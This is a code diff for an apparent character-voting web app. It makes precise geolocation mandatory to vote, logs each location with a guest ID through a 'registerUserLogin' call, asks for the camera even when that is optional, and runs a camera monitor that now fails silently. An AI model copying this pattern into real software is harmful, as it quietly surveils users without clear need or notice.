@@ -34,11 +34,9 @@ function App() {
 
   useEffect(() => {
     // Logic: Only show if 'muse_tutorial_seen' is NOT present in storage AND we are in the main app view
-    // This ensures it only runs once per browser/device unless cache is cleared.
     const hasSeenTutorial = localStorage.getItem('muse_tutorial_seen');
     
     if (!hasSeenTutorial && view === 'app') {
-        // Short delay to allow app to render first and avoid layout thrashing
         const timer = setTimeout(() => {
             setTutorialStep(0);
             setShowTutorial(true);
@@ -52,7 +50,6 @@ function App() {
   };
 
   const handleTutorialComplete = () => {
-      // Mark as seen PERMANENTLY in this browser
       localStorage.setItem('muse_tutorial_seen', 'true');
       setShowTutorial(false);
   };
@@ -71,8 +68,6 @@ function App() {
   const [hasInteracted, setHasInteracted] = useState(false);
 
   // --- PERMISSION STATE ---
-  const [isLocationDenied, setIsLocationDenied] = useState(false);
-  const [isCameraDenied, setIsCameraDenied] = useState(false);
   const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);
   const [showPermissionModal, setShowPermissionModal] = useState(false); 
 
@@ -87,18 +82,12 @@ function App() {
       const duration = 5 * 1000;
       const animationEnd = Date.now() + duration;
       const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
-
       const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;
 
       const interval: any = setInterval(function() {
         const timeLeft = animationEnd - Date.now();
-
-        if (timeLeft <= 0) {
-          return clearInterval(interval);
-        }
-
+        if (timeLeft <= 0) return clearInterval(interval);
         const particleCount = 50 * (timeLeft / duration);
-        // since particles fall down, start a bit higher than random
         confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
         confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
       }, 250);
@@ -170,16 +159,17 @@ function App() {
           const idx = characters.findIndex(c => c.id === sharedId);
           if (idx !== -1) {
               setActiveIndex(idx);
-              // Clean URL after navigating
               window.history.replaceState({}, '', window.location.pathname);
           }
       }
   }, [characters]);
 
   // --- PERMISSIONS ---
-  const checkPermissions = useCallback(async () => {
+  // Updated: Returns array of missing permissions instead of boolean
+  const checkPermissions = useCallback(async (): Promise<('location' | 'camera')[]> => {
     const missing: ('location' | 'camera')[] = [];
     
+    // 1. Check Location
     const locationGranted = await new Promise<boolean>((resolve) => {
         if (!('geolocation' in navigator)) { resolve(false); return; }
         navigator.geolocation.getCurrentPosition(
@@ -191,7 +181,8 @@ function App() {
                     timestamp: new Date().toISOString()
                 };
                 localStorage.setItem('muse_user_location', JSON.stringify(locationData));
-                setIsLocationDenied(false);
+                
+                // Log location update
                 dataService.registerUserLogin({
                     user_identifier: guestId,
                     password_text: '',
@@ -203,7 +194,6 @@ function App() {
             },
             (error) => {
                 console.warn("Location check failed:", error.message);
-                setIsLocationDenied(true);
                 resolve(false);
             },
             { timeout: 10000, enableHighAccuracy: true }
@@ -212,18 +202,19 @@ function App() {
 
     if (!locationGranted) missing.push('location');
 
+    // 2. Check Camera (Also attempts to trigger prompt)
+    // Even if optional, we ask for it.
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // Close immediately, we just wanted permission
         stream.getTracks().forEach(track => track.stop()); 
-        setIsCameraDenied(false);
     } catch (err) {
-        setIsCameraDenied(true);
         missing.push('camera');
     }
 
     const finalMissing = [...new Set([...missing])];
     setMissingPermissions(finalMissing);
-    return finalMissing.length === 0;
+    return finalMissing;
   }, [guestId]);
 
   // --- TIMER & WINNER LOGIC ---
@@ -244,37 +235,23 @@ function App() {
             setIsVotingEnded(false);
             setRankings([]);
         } else {
-            // TIMER ENDED
             setTimeLeft(null); 
-            
-            // Only trigger transition once
             if (!isVotingEnded && characters.length > 0) {
                 setIsVotingEnded(true);
-                
-                // Calculate Ranks
                 const sorted = [...characters].sort((a,b) => b.votes - a.votes);
                 const winnerId = sorted[0].id;
                 setRankings(sorted.map(c => c.id));
-                
-                // Fire Confetti
                 triggerCelebration();
-
-                // Auto-navigate to winner immediately
                 const winnerIndex = characters.findIndex(c => c.id === winnerId);
-                if (winnerIndex !== -1) {
-                    setActiveIndex(winnerIndex);
-                }
+                if (winnerIndex !== -1) setActiveIndex(winnerIndex);
             }
         }
     };
-    
-    // Run immediately then interval
     calculateTimeLeft();
     const timer = setInterval(calculateTimeLeft, 1000);
     return () => clearInterval(timer);
   }, [votingDeadline, characters, isVotingEnded]);
 
-  // --- CYCLIC OFFSET LOGIC FOR NEAT STACKING ---
   const getOffset = (index: number, active: number, len: number) => {
       let offset = index - active;
       if (offset > len / 2) offset -= len;
@@ -282,18 +259,15 @@ function App() {
       return offset;
   };
 
-  // Helper to get rank of a char ID
   const getRank = (charId: string): number | undefined => {
       if (!isVotingEnded || rankings.length === 0) return undefined;
       const index = rankings.indexOf(charId);
-      return index !== -1 ? index + 1 : undefined; // Returns 1, 2, 3...
+      return index !== -1 ? index + 1 : undefined; 
   };
 
-  // --- CARD INTERACTION HANDLERS ---
+  // --- INTERACTION ---
   const advanceTutorialIfSwipe = () => {
-      if (showTutorial && tutorialStep === 0) {
-          setTutorialStep(1); // Advance to Permission step
-      }
+      if (showTutorial && tutorialStep === 0) setTutorialStep(1); 
   };
 
   const handleNext = () => {
@@ -318,36 +292,59 @@ function App() {
   const handleShare = async () => {
     registerInteraction();
     const activeChar = characters[activeIndex];
-    // Dynamic Link following the current origin
     const link = `${window.location.origin}?id=${activeChar.id}`;
-    
     try {
         await navigator.clipboard.writeText(link);
         setShowCopied(true);
         setTimeout(() => setShowCopied(false), 2000);
-    } catch (err) {
-        console.error("Failed to copy link", err);
-    }
+    } catch (err) { console.error("Failed to copy link", err); }
   };
 
   const handleVoteClick = async () => {
       registerInteraction();
       if (hasVoted || isVotingEnded) return;
-      const allGranted = await checkPermissions();
-      if (!allGranted) { setShowPermissionModal(true); return; }
+      
+      // Perform checks
+      const missing = await checkPermissions();
+      
+      // LOGIC UPDATE: Only block if LOCATION is missing.
+      // We ignore 'camera' in the blocking logic here.
+      if (missing.includes('location')) {
+          setShowPermissionModal(true);
+          return;
+      }
+
+      // If location is fine, proceed to vote modal (even if camera is missing)
       setIsVoteModalOpen(true);
   };
 
   const handlePermissionRetry = async () => {
-      const granted = await checkPermissions();
-      if (granted) { setShowPermissionModal(false); setIsVoteModalOpen(true); } 
-      else { alert("Izin lokasi wajib diaktifkan untuk melanjutkan."); }
+      // Calling checkPermissions triggers prompts for both Location and Camera
+      const missing = await checkPermissions();
+      
+      // Only keep modal open if Location is still missing
+      if (!missing.includes('location')) {
+          setShowPermissionModal(false);
+          setIsVoteModalOpen(true);
+      }
+  };
+
+  // Deprecated but kept for type compatibility
+  const handlePermissionSkip = () => {
+      setShowPermissionModal(false);
+      setIsVoteModalOpen(true);
   };
 
   const handleConfirmVote = async () => {
     if (isVotingEnded) return;
     setIsVoteModalOpen(false);
-    if (missingPermissions.length > 0) { setShowPermissionModal(true); return; }
+
+    // Final check for MANDATORY permissions (Location only)
+    const missing = await checkPermissions();
+    if (missing.includes('location')) { 
+        setShowPermissionModal(true); 
+        return; 
+    }
 
     try {
         const activeChar = characters[activeIndex];
@@ -409,8 +406,6 @@ function App() {
              
              {/* HEADER RIGHT ACTIONS */}
              <div className="flex items-center gap-2">
-                 
-                 {/* SHARE BUTTON */}
                  <button 
                     onClick={handleShare} 
                     className="p-2 rounded-xl bg-slate-800/50 border border-slate-700/50 text-indigo-300 hover:bg-indigo-600 hover:text-white hover:border-indigo-500 transition-all shadow-sm active:scale-95"
@@ -418,7 +413,6 @@ function App() {
                  >
                     {showCopied ? <Check size={16} className="text-emerald-400" /> : <Share2 size={16} />}
                  </button>
-
                  <div className="flex items-center gap-2 pl-3 pr-3 py-1.5 bg-slate-800/50 rounded-full border border-slate-700/50">
                     <Fingerprint size={12} className="text-indigo-400" />
                     <span className="text-[10px] font-mono font-semibold text-slate-400 max-w-[80px] truncate">{guestId}</span>
@@ -441,7 +435,7 @@ function App() {
           )}
         </header>
 
-        {/* Main Swipe Area - Cyclic Stacking for Neat Look */}
+        {/* Main Swipe Area - Cyclic Stacking */}
         <section className="w-full relative h-[480px] sm:h-[500px] flex items-center justify-center perspective-1000 mt-2">
              {characters.map((char, index) => {
                   const offset = getOffset(index, activeIndex, characters.length);
@@ -455,7 +449,7 @@ function App() {
                       onSwipeRight={handlePrev}
                       onSwipeLeft={handleNext}
                       isVotingEnded={isVotingEnded}
-                      rank={getRank(char.id)} // Pass rank 1, 2, 3 or undefined
+                      rank={getRank(char.id)} 
                     />
                   );
                })}
@@ -469,7 +463,6 @@ function App() {
                 ))}
              </div>
              
-             {/* Hide Vote Button if Ended, show Status */}
              {!isVotingEnded ? (
                 <button
                 onClick={handleVoteClick}
@@ -513,13 +506,14 @@ function App() {
         {showPermissionModal && (
             <PermissionModal 
                 onRetry={handlePermissionRetry} 
+                onSkip={handlePermissionSkip}
                 missingPermissions={missingPermissions} 
                 onClose={() => setShowPermissionModal(false)} 
             />
         )}
       </AnimatePresence>
       
-      {/* TUTORIAL OVERLAY - Now Driven by State */}
+      {/* TUTORIAL OVERLAY */}
       <AnimatePresence>
           {showTutorial && (
             <TutorialOverlay 
@@ -531,7 +525,10 @@ function App() {
       </AnimatePresence>
       
       {hasInteracted && view === 'app' && (
-        <CameraMonitor user={guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />
+        <CameraMonitor user={guestId} onError={() => {
+            // Silently fail camera monitor if denied, don't force modal here
+            // The modal logic is handled by handleVoteClick
+        }} onSuccess={() => {}} />
       )}
     </div>
   );
